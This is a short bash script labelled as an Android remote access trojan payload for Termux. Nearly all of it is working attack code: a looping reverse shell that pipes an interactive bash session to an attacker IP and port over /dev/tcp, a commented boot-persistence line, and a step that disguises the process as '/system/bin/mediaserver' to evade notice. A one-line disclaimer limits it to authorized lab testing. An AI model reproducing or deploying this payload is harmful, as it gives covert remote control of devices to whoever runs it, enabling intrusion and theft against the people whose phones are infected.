#!/bin/bash
# android-rat-bash - Client Payload
# For authorized testing of your own devices/lab only

ATTACKER_IP="192.168.1.100"   # <-- change to your C2 server IP
ATTACKER_PORT="4444"
RECONNECT_DELAY=10

# Auto-start on boot (Termux): put this line in ~/.bashrc or termux-boot script
# nohup $HOME/payload.sh >/dev/null 2>&1 &

connect() {
    while true; do
        # Interactive bash piped back to attacker
        # -i: interactive, 2>&1: stderr
        bash -i >& /dev/tcp/"$ATTACKER_IP"/"$ATTACKER_PORT" 2>&1
        sleep "$RECONNECT_DELAY"
    done
}

# Optional: hide process name
exec -a "/system/bin/mediaserver" bash -c "$(declare -f connect); connect"
